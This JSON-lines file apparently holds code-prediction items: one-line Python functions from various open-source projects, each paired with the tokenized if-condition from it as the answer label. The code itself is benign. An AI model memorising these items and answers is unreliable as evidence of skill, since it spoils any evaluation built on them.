{"input": "def run(self): global _cameras while 1: for cam in _cameras: if cam.pygame_camera: cam.pygame_buffer = cam.capture.get_image(cam.pygame_buffer) else: cv.GrabFrame(cam.capture) cam._threadcapturetime = time.time() time.sleep(0.04) # max 25 fps, if you're lucky", "label": "if cam . pygame_camera :"}
{"input": "def handle_exception(self, e, result): for k in sorted(result.thrift_spec): if result.thrift_spec[k][1] == \"success\": continue _, exc_name, exc_cls, _ = result.thrift_spec[k] if isinstance(e, exc_cls): setattr(result, exc_name, e) return True return False", "label": "if isinstance ( e , exc_cls ) :"}
{"input": "def for_module(cls, modname: str) -> \"ModuleAnalyzer\": if (\"module\", modname) in cls.cache: entry = cls.cache[\"module\", modname] if isinstance(entry, PycodeError): raise entry return entry try: filename, source = cls.get_module_source(modname) if source is not None: obj = cls.for_string(source, modname, filename or \"<string>\") elif filename is not None: obj = cls.for_file(filename, modname) except PycodeError as err: cls.cache[\"module\", modname] = err raise cls.cache[\"module\", modname] = obj return obj", "label": "if source is not None :"}
{"input": "def visit_productionlist(self, node): self.new_state() names = [] for production in node: names.append(production[\"tokenname\"]) maxlen = max(len(name) for name in names) for production in node: if production[\"tokenname\"]: self.add_text(production[\"tokenname\"].ljust(maxlen) + \" ::=\") lastname = production[\"tokenname\"] else: self.add_text(\"%s \" % (\" \" * len(lastname))) self.add_text(production.astext() + \"\\n\") self.end_state(wrap=False) raise nodes.SkipNode", "label": "if production [ \"tokenname\" ] :"}
{"input": "def transport_vmware_guestinfo(): rpctool = \"vmware-rpctool\" not_found = None if not subp.which(rpctool): return not_found cmd = [rpctool, \"info-get guestinfo.ovfEnv\"] try: out, _err = subp.subp(cmd) if out: return out LOG.debug(\"cmd %s exited 0 with empty stdout: %s\", cmd, out) except subp.ProcessExecutionError as e: if e.exit_code != 1: LOG.warning(\"%s exited with code %d\", rpctool, e.exit_code) LOG.debug(e) return not_found", "label": "if out :"}
{"input": "def MakeWidthArray(fm): # Make character width array s = \"{\\n\\t\" cw = fm[\"Widths\"] for i in xrange(0, 256): if chr(i) == \"'\": s += \"'\\\\''\" elif chr(i) == \"\\\\\": s += \"'\\\\\\\\'\" elif i >= 32 and i <= 126: s += \"'\" + chr(i) + \"'\" else: s += \"chr(%d)\" % i s += \":\" + fm[\"Widths\"][i] if i < 255: s += \",\" if (i + 1) % 22 == 0: s += \"\\n\\t\" s += \"}\" return s", "label": "if ( i + 1 ) % 22 == 0 :"}
{"input": "def lookup_config_file(filename: str) -> Optional[str]: \"\"\"Return config file PATH.\"\"\" for path in [find_vcs_root(default=\"~\"), \"~\"]: f = os.path.expanduser(\"%s/%s\" % (path, filename)) if os.path.isfile(f): LOG.info(\"Found config file %s\", f) return f return None", "label": "if os . path . isfile ( f ) :"}
{"input": "def load_freq_dict(self, freq_dict_filename: str): with open(str(expand_path(freq_dict_filename)), \"r\") as fl: lines = fl.readlines() pos_freq_dict = defaultdict(list) for line in lines: line_split = line.strip(\"\\n\").split(\"\\t\") if re.match(\"[\\d]+\\.[\\d]+\", line_split[2]): pos_freq_dict[line_split[1]].append((line_split[0], float(line_split[2]))) nouns_with_freq = pos_freq_dict[\"s\"] self.nouns_dict = {noun: freq for noun, freq in nouns_with_freq}", "label": "if re . match ( \"[\\d]+\\.[\\d]+\" , line_split [ 2 ] ) :"}
{"input": "def do_visual_mode(self): \"\"\"Handle strokes in visual mode.\"\"\" try: self.n1 = self.n = 1 self.do_state( self.vis_dispatch_d, mode_name=\"visual-line\" if self.visual_line_flag else \"visual\", ) if self.visual_line_flag: self.visual_line_helper() except Exception: g.es_exception() self.quit()", "label": "if self . visual_line_flag :"}
{"input": "def cleanup(self): log.info(\"\") log.info(\"Cleaning up.. \") status = self._capture_output(\"status\", \"--porcelain\") status = status.split(\"\\n\") for line in status: filepath = line.split() if len(filepath) == 0: continue filepath = filepath[-1] if filepath[-3:] != \"rej\" and filepath[-5:] != \"porig\": continue try: log.info(\"Removing temp file %s \" % filepath) os.remove(os.path.join(self.base_dir, filepath)) except: log.warn(\"File removal failed, you should manually remove %s\" % filepath) pass", "label": "if len ( filepath ) == 0 :"}
{"input": "def OnBodyRClick(self, event=None): try: c = self.c p = c.currentPosition() if not g.doHook(\"bodyrclick1\", c=c, p=p, v=p, event=event): c.k.showStateAndMode(w=c.frame.body.bodyCtrl) g.doHook(\"bodyrclick2\", c=c, p=p, v=p, event=event) except: g.es_event_exception(\"iconrclick\")", "label": "if not g . doHook ( \"bodyrclick1\" , c = c , p = p , v = p , event = event ) :"}
{"input": "def receiver(): \"\"\"receive messages with polling\"\"\" pull = ctx.socket(zmq.PULL) pull.connect(url) poller = Poller() poller.register(pull, zmq.POLLIN) while True: events = await poller.poll() if pull in dict(events): print(\"recving\", events) msg = await pull.recv_multipart() print(\"recvd\", msg)", "label": "if pull in dict ( events ) :"}
{"input": "def sched(self): for k, q in self.q.items(): if q and k not in self.cur: ent = q.popleft() self.cur[k] = ent self.run_one(ent, k)", "label": "if q and k not in self . cur :"}
{"input": "def eval_dummy_genomes_iznn(genomes, config): for genome_id, genome in genomes: net = neat.iznn.IZNN.create(genome, config) if genome_id < 10: net.reset() genome.fitness = 0.0 elif genome_id <= 150: genome.fitness = 0.5 else: genome.fitness = 1.0", "label": "if genome_id < 10 :"}
{"input": "def handle_noargs(self, **options): # Inspired by Postfix's \"postconf -n\". from django.conf import settings, global_settings # Because settings are imported lazily, we need to explicitly load them. settings._setup() user_settings = module_to_dict(settings._wrapped) default_settings = module_to_dict(global_settings) output = [] for key in sorted(user_settings.keys()): if key not in default_settings: output.append(\"%s = %s ###\" % (key, user_settings[key])) elif user_settings[key] != default_settings[key]: output.append(\"%s = %s\" % (key, user_settings[key])) return \"\\n\".join(output)", "label": "elif user_settings [ key ] != default_settings [ key ] :"}
{"input": "def test_get_chat_thread(self): async with self.chat_client: await self._create_thread() get_thread_result = await self.chat_client.get_chat_thread(self.thread_id) assert get_thread_result.id == self.thread_id # delete created users and chat threads if not self.is_playback(): await self.chat_client.delete_chat_thread(self.thread_id)", "label": "if not self . is_playback ( ) :"}
{"input": "def consume(self): if not self.inputState.guessing: c = self.LA(1) if self.caseSensitive: self.append(c) else: # use input.LA(), not LA(), to get original case # CharScanner.LA() would toLower it. c = self.inputState.input.LA(1) self.append(c) if c and c in \"\\t\": self.tab() else: self.inputState.column += 1 self.inputState.input.consume()", "label": "if self . caseSensitive :"}
{"input": "def commandComplete(self, cmd): if self.property: if cmd.didFail(): return result = self.observer.getStdout() if self.strip: result = result.strip() propname = self.property self.setProperty(propname, result, \"SetPropertyFromCommand Step\") self.property_changes[propname] = result else: new_props = self.extract_fn( cmd.rc, self.observer.getStdout(), self.observer.getStderr() ) for k, v in iteritems(new_props): self.setProperty(k, v, \"SetPropertyFromCommand Step\") self.property_changes = new_props", "label": "if cmd . didFail ( ) :"}
{"input": "def any(self, provider_name): result = authomatic.login(Webapp2Adapter(self), provider_name) if result: apis = [] if result.user: result.user.update() if result.user.credentials: apis = config.config.get(provider_name, {}).get(\"_apis\", {}) nice_provider_name = ( config.config.get(provider_name, {}).get(\"_name\") or provider_name.capitalize() ) render( self, result, result.popup_js(custom=dict(apis=apis, provider_name=nice_provider_name)), )", "label": "if result . user . credentials :"}
{"input": "def set_lock(self, lock_closed=True, device=0, timeout=0): if self.handle: action = 0x02 if lock_closed else 0x01 reply = self.write_register(_R.receiver_pairing, action, device, timeout) if reply: return True _log.warn( \"%s: failed to %s the receiver lock\", self, \"close\" if lock_closed else \"open\", )", "label": "if reply :"}
{"input": "def connect_thread(self, sleep_time=0): time.sleep(sleep_time) try: while self.running and self._need_more_ip(): if self.new_conn_pool.qsize() > self.config.https_connection_pool_max: break self.connect_process() finally: self.thread_num_lock.acquire() self.thread_num -= 1 self.thread_num_lock.release()", "label": "if self . new_conn_pool . qsize ( ) > self . config . https_connection_pool_max :"}
{"input": "def train_job( guest_party_id, host_party_id, arbiter_party_id, train_conf_path, train_dsl_path ): train = TrainSBTModel() train.set_config(guest_party_id, host_party_id, arbiter_party_id, train_conf_path) train.set_dsl(train_dsl_path) status = train.submit() if status: is_success = train.wait_success(timeout=600) if is_success: train.get_component_metrics() train.get_component_output_model() train.get_component_output_data() return train return False", "label": "if is_success :"}
{"input": "def get_version(): INIT = os.path.abspath(os.path.join(HERE, \"..\", \"pyftpdlib\", \"__init__.py\")) with open(INIT, \"r\") as f: for line in f: if line.startswith(\"__ver__\"): ret = eval(line.strip().split(\" = \")[1]) assert ret.count(\".\") == 2, ret for num in ret.split(\".\"): assert num.isdigit(), ret return ret else: raise ValueError(\"couldn't find version string\")", "label": "if line . startswith ( \"__ver__\" ) :"}
{"input": "def get_terminus_panel(self, window, visible_only=False): if visible_only: active_panel = window.active_panel() panels = [active_panel] if active_panel else [] else: panels = window.panels() for panel in panels: panel_name = panel.replace(\"output.\", \"\") if panel_name == EXEC_PANEL: continue panel_view = window.find_output_panel(panel_name) if panel_view: terminal = Terminal.from_id(panel_view.id()) if terminal: return panel_view return None", "label": "if terminal :"}
{"input": "def to_internal_value(self, data): site = get_current_site() pages_root = reverse(\"pages-root\") ret = [] for path in data: if path.startswith(pages_root): path = path[len(pages_root) :] # strip any final slash if path.endswith(\"/\"): path = path[:-1] page = get_page_from_path(site, path) if page: ret.append(page) return ret", "label": "if path . startswith ( pages_root ) :"}
{"input": "def forward(self, inputs): input_dtype = inputs[0].dtype if self.comm.rank == self.root: # convert to float32 for communication if numpy.float16 == input_dtype: inputs = tuple([item.astype(numpy.float32) for item in inputs]) y = self.comm.scatter(inputs, self.root) else: y = self.comm.scatter(None, self.root) # convert back if numpy.float16 == input_dtype: y = y.astype(input_dtype) return (y,)", "label": "if numpy . float16 == input_dtype :"}
{"input": "def discover_misago_admin(): for app in apps.get_app_configs(): module = import_module(app.name) if not hasattr(module, \"admin\"): continue admin_module = import_module(\"%s.admin\" % app.name) if hasattr(admin_module, \"MisagoAdminExtension\"): extension = getattr(admin_module, \"MisagoAdminExtension\")() if hasattr(extension, \"register_navigation_nodes\"): extension.register_navigation_nodes(site) if hasattr(extension, \"register_urlpatterns\"): extension.register_urlpatterns(urlpatterns)", "label": "if hasattr ( admin_module , \"MisagoAdminExtension\" ) :"}
{"input": "def overwrite_timeout( initial_node: dict, path: str, hash_: str, size_: int, rsf: bool ) -> int: minutes = 10 while minutes > 0: time.sleep(60) minutes -= 1 n = acd_client.get_metadata(initial_node[\"id\"]) if n[\"version\"] > initial_node[\"version\"]: return upload_complete(n, path, hash_, size_, rsf) logger.warning('Timeout while overwriting \"%s\".' % path) return UL_TIMEOUT", "label": "if n [ \"version\" ] > initial_node [ \"version\" ] :"}
{"input": "def write(self, s, spos): if not s: return # Force s to be a string or unicode if not isinstance(s, basestring): s = str(s) slen = self.len if spos == slen: self.len = self.pos = spos + len(s) return if spos > slen: slen = spos newpos = spos + len(s) if spos < slen: if self.buflist: self.buf += \"\".join(self.buflist) self.buflist = [self.buf[:spos], s, self.buf[newpos:]] if newpos > slen: slen = newpos else: self.buflist.append(s)", "label": "if newpos > slen :"}
{"input": "def _print_one_entry(news_entry: xml.etree.ElementTree.Element) -> None: child: xml.etree.ElementTree.Element for child in news_entry: if \"title\" in child.tag: title = str(child.text) if \"pubDate\" in child.tag: pub_date = str(child.text) if \"description\" in child.tag: description = str(child.text) print_stdout(color_line(title, 14) + \" (\" + bold_line(pub_date) + \")\") print_stdout(format_paragraph(strip_tags(description))) print_stdout()", "label": "if \"description\" in child . tag :"}
{"input": "def get_sequence_type_str(x: Sequence[Any]) -> str: container_type = type(x).__name__ if not x: if container_type == \"list\": return \"[]\" else: return container_type + \"([])\" elem_type = get_type_str(x[0]) if container_type == \"list\": if len(x) == 1: return \"[\" + elem_type + \"]\" else: return \"[\" + elem_type + \", ...]\" else: if len(x) == 1: return f\"{container_type}([{elem_type}])\" else: return f\"{container_type}([{elem_type}, ...])\"", "label": "if len ( x ) == 1 :"}
{"input": "def signal_notebook_switch_page(self, notebook, current_page, index): if not hasattr(self.parent, \"rpc\"): return # previous_page = notebook.get_nth_page(self.last_page_id) self.last_page_id = index for tab in self.tabs.values(): if current_page != tab.box: continue if hasattr(tab, \"load_campaign_information\"): tab.load_campaign_information(force=False)", "label": "if hasattr ( tab , \"load_campaign_information\" ) :"}
{"input": "def format_string(self, templ, args): templ = self.to_native(templ) if isinstance(args, nodes.Arguments): args = args.arguments for (i, arg) in enumerate(args): arg = self.to_native(self.reduce_single(arg)) if isinstance(arg, bool): # Python boolean is upper case. arg = str(arg).lower() templ = templ.replace(\"@{}@\".format(i), str(arg)) return templ", "label": "if isinstance ( arg , bool ) :"}
{"input": "def execute_Single(self, object, smooth): if getattr(object, \"type\", \"\") == \"MESH\": mesh = object.data if len(mesh.polygons) > 0: smoothList = [smooth] * len(mesh.polygons) mesh.polygons.foreach_set(\"use_smooth\", smoothList) # trigger update mesh.polygons[0].use_smooth = smooth return object", "label": "if len ( mesh . polygons ) > 0 :"}
{"input": "def _enumerate_visible_deps(self, dep, predicate): # We present the dependencies out of classpath order and instead in alphabetized internal deps, # then alphabetized external deps order for ease in scanning output. dependencies = sorted(x for x in getattr(dep, \"dependencies\", [])) if not self.is_internal_only: dependencies.extend( sorted( (x for x in getattr(dep, \"jar_dependencies\", [])), key=lambda x: (x.org, x.name, x.rev, x.classifier), ) ) for inner_dep in dependencies: dep_id, internal = self._dep_id(inner_dep) if predicate(internal): yield inner_dep", "label": "if predicate ( internal ) :"}
{"input": "def stop_test(self): if self.master: self.log.info(\"Ending cloud test...\") if not self._last_status: self.get_master_status() if self._last_status[\"progress\"] >= 100: self.master.stop() else: self.master.terminate()", "label": "if self . _last_status [ \"progress\" ] >= 100 :"}
{"input": "def run(self, workspace): \"\"\"Run the module\"\"\" if self.show_window: m = workspace.get_measurements() x = m.get_current_measurement(self.get_object(), self.x_axis.value) if self.wants_xbounds: x = x[x > self.xbounds.min] x = x[x < self.xbounds.max] workspace.display_data.x = x workspace.display_data.title = \"{} (cycle {})\".format( self.title.value, workspace.measurements.image_set_number )", "label": "if self . wants_xbounds :"}
{"input": "def L_op(self, inputs, outputs, gout): (x,) = inputs (gz,) = gout if x.type in complex_types: raise NotImplementedError() if outputs[0].type in discrete_types: if x.type in discrete_types: return [x.zeros_like(dtype=theano.config.floatX)] else: return [x.zeros_like()] return (gz / (np.cast[x.type](1) - sqr(x)),)", "label": "if x . type in discrete_types :"}
{"input": "def _which(cls, progname): progname = progname.lower() for p in cls.env.path: for ext in cls._EXTENSIONS: fn = p / (progname + ext) if fn.access(\"x\") and not fn.is_dir(): return fn return None", "label": "if fn . access ( \"x\" ) and not fn . is_dir ( ) :"}
{"input": "def iterate(self, prod_, rule_): newProduction = \"\" for i in range(len(prod_)): step = self.production[i] if step == \"W\": newProduction = newProduction + self.ruleW elif step == \"X\": newProduction = newProduction + self.ruleX elif step == \"Y\": newProduction = newProduction + self.ruleY elif step == \"Z\": newProduction = newProduction + self.ruleZ elif step != \"F\": newProduction = newProduction + step self.drawLength = self.drawLength * 0.5 self.generations += 1 return newProduction", "label": "elif step == \"Y\" :"}
{"input": "def update(self, mapping, update_only=False): for name in mapping: if update_only and name in self: # nested and inner objects, merge recursively if hasattr(self[name], \"update\"): # FIXME only merge subfields, not the settings self[name].update(mapping[name], update_only) continue self.field(name, mapping[name]) if update_only: for name in mapping._meta: if name not in self._meta: self._meta[name] = mapping._meta[name] else: self._meta.update(mapping._meta)", "label": "if name not in self . _meta :"}
{"input": "def Flatten(self, metadata, value_to_flatten): if metadata: self.metadata = metadata for desc in value_to_flatten.type_infos: if desc.name == \"metadata\": continue if hasattr(self, desc.name) and value_to_flatten.HasField(desc.name): setattr(self, desc.name, getattr(value_to_flatten, desc.name))", "label": "if hasattr ( self , desc . name ) and value_to_flatten . HasField ( desc . name ) :"}
{"input": "def addnode(self, parent, data): print(\"aaa\", data) for i in data: print(i) if i == \"-\": continue if isinstance(i, tuple): item = self.tre_plugins.AppendItem(parent, i[0].title) self.tre_plugins.SetItemData(item, i[0]) self.addnode(item, i[1]) else: item = self.tre_plugins.AppendItem(parent, i[0].title) self.tre_plugins.SetItemData(item, i[0])", "label": "if isinstance ( i , tuple ) :"}
{"input": "def load_timer(string): if \".\" not in string: raise argparse.ArgumentTypeError( \"Value for --benchmark-timer must be in dotted form. Eg: 'module.attr'.\" ) mod, attr = string.rsplit(\".\", 1) if mod == \"pep418\": if PY3: import time return NameWrapper(getattr(time, attr)) else: from . import pep418 return NameWrapper(getattr(pep418, attr)) else: __import__(mod) mod = sys.modules[mod] return NameWrapper(getattr(mod, attr))", "label": "if PY3 :"}
{"input": "def _is_an_attribute(self, pyname): if pyname is not None and isinstance(pyname, pynames.AssignedName): pymodule, lineno = self.pyname.get_definition_location() scope = pymodule.get_scope().get_inner_scope_for_line(lineno) if scope.get_kind() == \"Class\": return pyname in list(scope.get_names().values()) parent = scope.parent if parent is not None and parent.get_kind() == \"Class\": return pyname in list(parent.get_names().values()) return False", "label": "if parent is not None and parent . get_kind ( ) == \"Class\" :"}
{"input": "def _format_arg(self, name, spec, value): if name == \"title\": if isinstance(value, bool) and value: return \"--title\" elif isinstance(value, str): return \"--title --title_text %s\" % (value,) else: raise ValueError('Unknown value for \"title\" argument: ' + str(value)) return super(Pik, self)._format_arg(name, spec, value)", "label": "elif isinstance ( value , str ) :"}
{"input": "def total_form_count(self): \"\"\"Returns the total number of forms in this FormSet.\"\"\" if self.is_bound: return self.management_form.cleaned_data[TOTAL_FORM_COUNT] else: initial_forms = self.initial_form_count() total_forms = initial_forms + self.extra # Allow all existing related objects/inlines to be displayed, # but don't allow extra beyond max_num. if initial_forms > self.max_num >= 0: total_forms = initial_forms elif total_forms > self.max_num >= 0: total_forms = self.max_num return total_forms", "label": "if initial_forms > self . max_num >= 0 :"}
{"input": "def GetTestNamesFromSuites(test_suite): \"\"\"Takes a list of test suites and returns a list of contained test names.\"\"\" suites = [test_suite] test_names = [] while suites: suite = suites.pop() for test in suite: if isinstance(test, unittest.TestSuite): suites.append(test) else: test_names.append(test.id()[len(\"gslib.tests.test_\") :]) return test_names", "label": "if isinstance ( test , unittest . TestSuite ) :"}
{"input": "def readArgs(self, node): res = {} for c in self.getChildrenOf(node): val = c.getAttribute(\"val\") if val in self.modules: res[str(c.nodeName)] = self.modules[val] elif val in self.mothers: res[str(c.nodeName)] = self.mothers[val] elif val != \"\": res[str(c.nodeName)] = eval(val) return res", "label": "if val in self . modules :"}
{"input": "def pop(self, k, default=Sentinel): with self._database.transaction(): node, is_single = self.convert_node(k) try: res = self[k] except KeyError: if default is Sentinel: raise return default del self[node] return res", "label": "if default is Sentinel :"}
{"input": "def wrapped_strategy(self): if self.__wrapped_strategy is None: if not inspect.isfunction(self.__definition): raise InvalidArgument( f\"Expected definition to be a function but got {self.__definition!r} \" f\"of type {type(self.__definition).__name__} instead.\" ) result = self.__definition() if result is self: raise InvalidArgument(\"Cannot define a deferred strategy to be itself\") check_strategy(result, \"definition()\") self.__wrapped_strategy = result self.__definition = None return self.__wrapped_strategy", "label": "if not inspect . isfunction ( self . __definition ) :"}
{"input": "def _on_fullscreen_requested(self, on): if not config.val.content.fullscreen.window: if on: self.state_before_fullscreen = self.windowState() self.setWindowState( Qt.WindowFullScreen | self.state_before_fullscreen # type: ignore[arg-type] ) # type: ignore[operator] elif self.isFullScreen(): self.setWindowState(self.state_before_fullscreen) log.misc.debug( \"on: {}, state before fullscreen: {}\".format( on, debug.qflags_key(Qt, self.state_before_fullscreen) ) )", "label": "if on :"}
{"input": "def update_defaults(self, *values, **kwargs): for value in values: if type(value) == dict: self.DEFAULT_CONFIGURATION.update(value) elif isinstance(value, types.ModuleType): self.__defaults_from_module(value) elif isinstance(value, str): if os.path.exists(value): self.__defaults_from_file(value) else: logger.warning(\"Configuration file {} does not exist.\".format(value)) elif isinstance(value, type(None)): pass else: raise ValueError(\"Cannot interpret {}\".format(value)) self.DEFAULT_CONFIGURATION.update(kwargs)", "label": "if os . path . exists ( value ) :"}
{"input": "def clear_output_directory(self): files = os.listdir(os.path.join(\"functional\", \"output\")) for f in files: if f in (\"README.txt\", \".svn\", \"CVS\"): continue # don't touch the infrastructure path = os.path.join(\"functional\", \"output\", f) if os.path.isdir(path): shutil.rmtree(path) else: os.remove(path)", "label": "if os . path . isdir ( path ) :"}
{"input": "def do_remove(self): if self.netconf.locked(\"dhcp\"): if not self.pid: pid = read_pid_file(\"/var/run/udhcpd.pan1.pid\") else: pid = self.pid if not kill(pid, \"udhcpd\"): logging.info(\"Stale dhcp lockfile found\") self.netconf.unlock(\"dhcp\")", "label": "if not self . pid :"}
{"input": "def __getattr__(self, attr): if attr.endswith(\"[]\"): searchName = attr[:-2] else: searchName = attr with _lazyLock: nestedClasses = _dependencyMap.get(self.__name__, []) if searchName in nestedClasses: return GetVmodlType(self.__name__ + \".\" + attr) else: return super(LazyType, self).__getattribute__(attr)", "label": "if searchName in nestedClasses :"}
{"input": "def allow_request(self, request, view): request.server = None allow = True view_name = view.get_view_name() allowed_views = [u\"System Data\", u\"Collectd Data\", u\"Legacy System Data\"] if view_name in allowed_views: server_key = view.kwargs.get(\"server_key\") server = server_model.get_server_by_key(server_key) if server: request.server = server # Needed in the Models server_status = throttle_status(server=server) if server_status.allow == False: allow = False return allow", "label": "if server :"}
{"input": "def serve_until_stopped(self): import select abort = 0 while not abort: rd, wr, ex = select.select([self.socket.fileno()], [], [], self.timeout) if rd: self.handle_request() logging._acquireLock() abort = self.abort logging._releaseLock()", "label": "if rd :"}
{"input": "def A(*args): if len(args) > 0 and hasattr(args[0], \"__iter__\"): # Iterable as argument if len(args) == 1: return np.array(list(args), dtype=np.float32) else: # Flatten arguments into one list l = list(args[0]) for e in args[1:]: if hasattr(e, \"__iter__\"): l.extend(e) else: l.append(e) return np.array(l, dtype=np.float32) return np.array(list(args), dtype=np.float32)", "label": "if len ( args ) == 1 :"}
{"input": "def _fix(self): op = [] for k in range(self.size): o = random.choice(self._opts) if type(o) is str: op.append((o, self.rndstr * 1)) else: op.append((o.name, o.randval()._fix())) return op", "label": "if type ( o ) is str :"}
{"input": "def lint_dynamic(self, rule): for file in chain(rule.output, rule.input): if is_flagged(file, \"dynamic\"): yield Lint( title=\"The dynamic flag is deprecated\", body=\"Use checkpoints instead, which are more powerful and less error-prone.\", links=[links.checkpoints], )", "label": "if is_flagged ( file , \"dynamic\" ) :"}
{"input": "def visit(ignored, dir, files): if os.path.basename(dir) not in test_names: for name in test_names: if name + \".py\" in files: path = os.path.join(dir, name + \".py\") if matcher(path[baselen:]): results.append(path) return if \"__init__.py\" not in files: stderr(\"%s is not a package\" % dir) return for file in files: if file.startswith(\"test\") and file.endswith(\".py\"): path = os.path.join(dir, file) if matcher(path[baselen:]): results.append(path)", "label": "if matcher ( path [ baselen : ] ) :"}
{"input": "def wrapped(*args, **kwargs): try: func(*args, **kwargs) except AssertionError as e: if retries: time.sleep(t_interval) retry_assertion(interval=t_interval, retries=t_retries - 1)(func)( *args, **kwargs ) else: raise e", "label": "if retries :"}
{"input": "def num2binary(l, bits=32): all = [] bin = \"\" for i in range(bits): if l & 0x1: bin = \"1\" + bin else: bin = \"0\" + bin l = l >> 1 if not ((i + 1) % 8): all.append(bin) bin = \"\" if bin: all.append(bin) all.reverse() assert l in (0, -1), \"number doesn't fit in number of bits\" return string.join(all, \" \")", "label": "if not ( ( i + 1 ) % 8 ) :"}
{"input": "def closest_enemy_ant(self, row1, col1, filter=None): # find the closest enemy ant from this row/col min_dist = maxint closest_ant = None for ant in self.enemy_ants(): if filter is None or ant not in filter: dist = self.distance(row1, col1, ant[0][0], ant[0][1]) if dist < min_dist: min_dist = dist closest_ant = ant[0] return closest_ant", "label": "if dist < min_dist :"}
{"input": "def _wrap(cls, parent, value): if isinstance(value, dict): # we know that `annotations` and `labels` are dicts and therefore don't want to convert them into K8sObject return ( value if parent in {\"annotations\", \"labels\"} and all(isinstance(v, six.string_types) for v in value.values()) else cls(value) ) elif isinstance(value, list): return [cls._wrap(None, v) for v in value] else: return value", "label": "if parent in { \"annotations\" , \"labels\" }"}
{"input": "def do_definition(tag): w.end_para() macro(\".TP\") w.started = True split = 0 pre = [] post = [] for typ, text in _bitlist(tag): if split: post.append((typ, text)) elif text.lstrip().startswith(\": \"): split = 1 post.append((typ, text.lstrip()[2:].lstrip())) else: pre.append((typ, text)) _boldline(pre) w.write(_text(post)) w.started = False", "label": "if split :"}
{"input": "def updateTree(self, v, x, y, h, level): yfirst = y if level == 0: yfirst += 10 while v: # g.trace(x,y,v) h, indent = self.updateNode(v, x, y) y += h if v.isExpanded() and v.firstChild(): y = self.updateTree(v.firstChild(), x + indent, y, h, level + 1) v = v.next() return y", "label": "if v . isExpanded ( ) and v . firstChild ( ) :"}
{"input": "def loop(self): while True: job = self.check_queue() if not job: time.sleep(20) continue self.run_job(job) time.sleep(5)", "label": "if not job :"}
{"input": "def _name_to_variable(self, name): r\"\"\"Find the corresponding variable given the specified name.\"\"\" pointer = self for m_name in name.split(\".\"): if m_name.isdigit(): num = int(m_name) pointer = pointer[num] # type: ignore else: pointer = getattr(pointer, m_name) return pointer # type: ignore", "label": "if m_name . isdigit ( ) :"}
{"input": "def fetch_cleanup(self): for cell in self.cover_cells: if cell.fetch_task is not None: log.debug( \"Removing cover art fetch task for %s\", cell.release[\"musicbrainz_albumid\"], ) self.tagger.webservice.remove_task(cell.fetch_task)", "label": "if cell . fetch_task is not None :"}
{"input": "def _get_lcmap_info(self, vol_name): ret_vals = { \"fc_id\": \"\", \"fc_name\": \"\", \"lc_map_count\": \"0\", } for lcmap in self._lcmappings_list.values(): if (lcmap[\"source\"] == vol_name) or (lcmap[\"target\"] == vol_name): ret_vals[\"fc_id\"] = lcmap[\"id\"] ret_vals[\"fc_name\"] = lcmap[\"name\"] ret_vals[\"lc_map_count\"] = \"1\" return ret_vals", "label": "if ( lcmap [ \"source\" ] == vol_name ) or ( lcmap [ \"target\" ] == vol_name ) :"}
{"input": "def on_event_clicked(self, widget, event): if event.type == Gdk.EventType.BUTTON_PRESS and event.button == 3: path = self.get_path_at_pos(int(event.x), int(event.y)) if path is not None: row = self.get(path[0], \"device\") if row: if self.Blueman is not None: if self.menu is None: self.menu = ManagerDeviceMenu(self.Blueman) self.menu.popup(None, None, None, None, event.button, event.time)", "label": "if self . Blueman is not None :"}
{"input": "def _find_node_with_predicate(self, node, predicate): if node != self._tree._root and predicate(node): return node item, cookie = self._tree.GetFirstChild(node) while item: if predicate(item): return item if self._tree.ItemHasChildren(item): result = self._find_node_with_predicate(item, predicate) if result: return result item, cookie = self._tree.GetNextChild(node, cookie) return None", "label": "if self . _tree . ItemHasChildren ( item ) :"}
{"input": "def expect_flow_sequence_item(self): if isinstance(self.event, SequenceEndEvent): self.indent = self.indents.pop() self.flow_level -= 1 if self.canonical: self.write_indicator(u\",\", False) self.write_indent() self.write_indicator(u\"]\", False) self.state = self.states.pop() else: self.write_indicator(u\",\", False) if self.canonical or self.column > self.best_width: self.write_indent() self.states.append(self.expect_flow_sequence_item) self.expect_node(sequence=True)", "label": "if self . canonical or self . column > self . best_width :"}
{"input": "def iteration(pts): n = len(pts) all_pts = pts + invert(pts) diagram = Voronoi(all_pts) vertices = restrict(diagram.vertices) centers = [] for site_idx in range(n): region_idx = diagram.point_region[site_idx] region = diagram.regions[region_idx] if -1 in region: site = pts[site_idx] centers.append(site) continue region_verts = np.array([vertices[i] for i in region]) center = weighted_center(region_verts, weight_field) centers.append(tuple(center)) return centers", "label": "if - 1 in region :"}
{"input": "def retry_call(self, key, f, time_expire, with_lock): self.RETRIES += 1 if self.RETRIES <= self.MAX_RETRIES: if self.fail_gracefully: self.RETRIES = 0 return f() logger.error(\"sleeping %s seconds before reconnecting\" % (2 * self.RETRIES)) time.sleep(2 * self.RETRIES) return self.__call__(key, f, time_expire, with_lock) else: self.RETRIES = 0 if self.fail_gracefully: return f raise RConnectionError(\"Redis instance is unavailable\")", "label": "if self . fail_gracefully :"}
{"input": "def load_model( self, model_name: str, path: str = None, model_type=None ) -> AbstractModel: if isinstance(model_name, AbstractModel): return model_name if model_name in self.models.keys(): return self.models[model_name] else: if path is None: path = self.get_model_attribute(model=model_name, attribute=\"path\") if model_type is None: model_type = self.get_model_attribute(model=model_name, attribute=\"type\") return model_type.load(path=path, reset_paths=self.reset_paths)", "label": "if path is None :"}
{"input": "def _GetPathType( args: rdf_artifacts.ArtifactCollectorFlowArgs, client_os: str ) -> rdf_paths.PathSpec.PathType: if args.use_tsk or args.use_raw_filesystem_access: if client_os == \"Windows\": return config.CONFIG[\"Server.raw_filesystem_access_pathtype\"] else: return rdf_paths.PathSpec.PathType.TSK else: return rdf_paths.PathSpec.PathType.OS", "label": "if client_os == \"Windows\" :"}
{"input": "def iter_links(self): # type: () -> Iterable[Link] \"\"\"Yields all links in the page\"\"\" document = html5lib.parse( self.content, transport_encoding=_get_encoding_from_headers(self.headers), namespaceHTMLElements=False, ) base_url = _determine_base_url(document, self.url) for anchor in document.findall(\".//a\"): link = _create_link_from_element( anchor, page_url=self.url, base_url=base_url, ) if link is None: continue yield link", "label": "if link is None :"}
{"input": "def on_leave( self, original_node: CSTNodeT, updated_node: CSTNodeT ) -> Union[cst.Import, cst.ImportFrom, CSTNodeT, RemovalSentinel]: if isinstance(updated_node, cst.Import): for alias in updated_node.names: name = alias.name if isinstance(name, cst.Name) and name.value == \"b\": return cst.RemoveFromParent() elif isinstance(updated_node, cst.ImportFrom): module = updated_node.module if isinstance(module, cst.Name) and module.value == \"e\": return cst.RemoveFromParent() return updated_node", "label": "if isinstance ( name , cst . Name ) and name . value == \"b\" :"}
